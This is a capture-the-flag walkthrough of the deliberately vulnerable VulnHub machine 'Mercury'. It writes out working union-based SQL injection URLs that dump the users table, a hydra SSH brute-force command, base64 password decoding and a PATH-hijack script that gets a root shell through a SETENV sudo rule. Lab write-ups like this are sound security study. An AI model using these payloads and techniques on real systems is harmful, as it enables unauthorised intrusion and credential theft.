[Mercury](https://www.vulnhub.com/entry/the-planets-mercury,544/) is an easy [vulnhub](https://vulnhub.com) box by SirFlash.  The challenges for me on this box were SQL injection and abuse of sudo rights.

First we find the box's IP address with an nmap scan of the subnet the vulnerable box is connected to.  

I had some issues finding mercury on the network.  I've been using VMware Workstation for my attacking box, but was unable to find the vulnerable box on the network. SirFlash said mercury "has been tested on VirtualBox so may not work correctly on VMware".  I was finally able to get my attacking box to see mercury by loading them both in VirtualBox, but didn't like the interface as much as VMware Workstation.  To get my Workstation attacker to see the VirtualBox target, I had to locate the MAC address listed in VIrtualBox's network settings on my host machine using arp -a:

![[Pasted image 20211115112622.png]]
![[Pasted image 20211115112302.png]]

then I could ping the associated IP address from my attacking box in WMware Workstation.  However, nmap didn't turn up anything so I had to use the -Pn flag, which forces nmap to scan the target even if it doesn't receive an ping response.  I'm still not sure exactly why nmap couldn't get a ping response since I coud manually.  It just goes to show that in a real penetration test, absense of evidence is not evidence of absense.  Things might be there even if you can't find them with the usual tools / settings.

I skipped the full scan of the network, because I had already identified the IP address:

```
$ nmap 192.168.1.193 -A -T4 -p- Pn
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 11:46 EST
Nmap scan report for mercury.home (192.168.1.193)
Host is up (0.00097s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 14 Nov 2021 16:46:52 GMT
|     Server: WSGIServer/0.2 CPython/3.8.10
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 14 Nov 2021 16:46:52 GMT
|     Server: WSGIServer/0.2 CPython/3.8.10
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 69
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Hello. This site is currently in development please check back later.
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

<snip>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.92 seconds
```

There's a /robots.txt file, but nothing interesting in it.  

Navigating to the website we see:

![[Pasted image 20211114115620.png]]

Before doing a thorough directory bust, just for the LULZ we see if there's an admin page and get an interesting error message:

![[Pasted image 20211114115733.png]]

It looks like there might be a url at mercuryfacts.

Indeed there is.

![[Pasted image 20211114120039.png]]

Let's look at the to do list first:  

![[Pasted image 20211114120116.png]]

Looks like there's a direct mysql call somewhere that may be ripe for injection.  Also there's a users table somewhere, which may be worth looking at.

Back to the /mercuryfacts page, we click on Load a Fact

![[Pasted image 20211114120631.png]]

Notice that it says Fact id: 1, and there's a 1 in the url?  Let's see if we can browse to another fact from the url:

![[Pasted image 20211114120729.png]]

I found about 8 facts, then the 9th one returns a blank fact.  I tried running a bruteforce intruder attack through burpsuite, but it didn't turn up anything very interesting.  The Fact id sounded like a sql database query so I tried the classic ' SQL injection in the url 

```
http://192.168.1.193:8080/mercuryfacts/9'
```

and got a very helpful error:

![[Pasted image 20211114121444.png]]

Looks like someone left debugging on.  The error message suggests the input is not being sanitized and vulnerable to SQLi.  Down in the local vars, we see the exact query: 

```
SELECT fact FROM facts WHERE id = 9'
```

Let's see if we can suss out the database version with a UNION clause, which allows us to string two SELECT statements together.  The full command passed to the parser ends up being

```
SELECT fact FROM facts WHERE id = 9 UNION SELECT @@version-- -

```

The '-- -' comments out anything else that follows, so it ends the statement.  Our url command is: 

```
http://192.168.1.193:8080/mercuryfacts/9 union select @@version-- -
```

![[Pasted image 20211115134450.png]]

Now lets enumerate, guessing some common tables and databases:

```
http://192.168.1.193:8080/mercuryfacts/9 union select table_name from information_schema.tables-- -
```

![[Pasted image 20211115134520.png]]

We find a table called 'users' that sounds promising.  We refine our columns search by adding a WHERE clause to only search for columns in the table 'users':

```
http://192.168.1.193:8080/mercuryfacts/9 union select column_name from information_schema.columns where table_name = 'users'-- -
```

![[Pasted image 20211115134550.png]]

The users table has id, password and username columns.  Let's try to pull them out: 

```
http://192.168.1.193:8080/mercuryfacts/9 union select username,password FROM users-- -
```

![[Pasted image 20211114124032.png]]

Uh-oh.  We have a column mismatch.  UNION SELECT statments have to have identical numbers of columns in each query.  Going back to our original query: 

```
SELECT fact FROM facts WHERE id = 9'
```

It looks like the first select statement is only pulling one column (fact).

We can put columns together with CONCAT, throwing a ":" in the middle for delineation:

```
http://192.168.1.193:8080/mercuryfacts/9 union select concat(username,":",password) FROM users-- -
```

![[Pasted image 20211115142207.png]]

Awesome!   Lets see if any of these will work with ssh using [hydra](https://hydra.cc/docs/intro/) to brute-force them.  (This is a bit overkill, but simple enough to run)

We put the usernames and passwords into two text files and run

```
$ hydra -L users.txt -P pass.txt ssh://192.168.1.193
```

![[Pasted image 20211115160808.png]]

Sweet!  Webmaster:mercuryisthesizeof0.056Earths works!  Let's login and see what we can find.

```
$ ssh webmaster@192.168.1.193                                         
```

![[Pasted image 20211115161639.png]]

We found the user flag!  Now lets see what we can do to move laterally or escalate privileges.

The first thing I like to check is whether there are any special sudo privileges with 

```
$ sudo -l
```

It prompts for a password and the one we used for ssh works, but webmaster cannot run sudo on this machine.

Right in our home folder is an interesting folder: mecury_proj.  In there is a notes.txt file.  When we cat it out we see what looks like base64 encoded passwords:

```
webmaster@mercury:~/mercury_proj$ cat notes.txt
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

Decoding them reveals the same password we had for webmaster and a new one for linuxmaster.

```
webmaster@mercury:~/mercury_proj$ echo bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK | base64 -d
mercuryisthesizeof0.056Earths
webmaster@mercury:~/mercury_proj$ echo bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== | base64 -d
mercurymeandiameteris4880km
```

Let's try to switch to linuxmaster:

```
$ su linuxmaster
```

prompts us for the password, and we sucessfully switched.  Checking sudo -l, we do have special permissions over a file:

```
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
linuxmaster@mercury:~$ 
```

We can run /usr/bin/check_syslog.sh as root.

Let's see what's in that file:

```
$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
```

Looks like it just reads the tail of the syslog file.  It's worth noting that this is not using the asolute path of the command tail, indicated by 

```
$ which tail
/usr/bin/tail
```

rather it's using a relative path, meaning it will use the first tail command it finds in the PATH variable:

```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

On execution, first /usr/local/sbin will be searched, then /usr/local/bin, and so on, until it finds the command in /usr/bin.  If we can put a file called tail earlier in the path than /usr/bin, we can write what we want to that file and when we execute check_syslog.sh as root, we can run any command we put in the file as root.

Because the SETENV flag is set in our [sudoers file](https://linux.die.net/man/5/sudoers), we can do this by adding our current directory (or any directory we have write permissions to) to our path variable, creating a file named tail that will pop a bash shell, and running check_syslog.sh.

First, in our home directory, we create a file named tail that will run whoami and open up a bash shell:

```
$ echo '#! /bin/bash' > tail
$ echo 'echo "Switching to $(whoami)"' >> tail
$ echo "/bin/bash" >> tail
# cat tail
"#! /bin/bash"
echo "Switching to $(whoami)"
/bin/bash
```

now we add the present working directory (pwd) to the begining of the PATH environement variable.

```
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
$ export PATH=$(pwd):$PATH
$ echo $PATH
/home/linuxmaster:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

finally,  make the file executable

```
$ chmod +x tail
```

and run check_syslog.sh with the -E flag to preserve the PATH enviornment variable:

```
$ sudo -E PATH=$PATH /usr/bin/check_syslog.sh
```

![[Pasted image 20211115144902.png]]

Rooted!

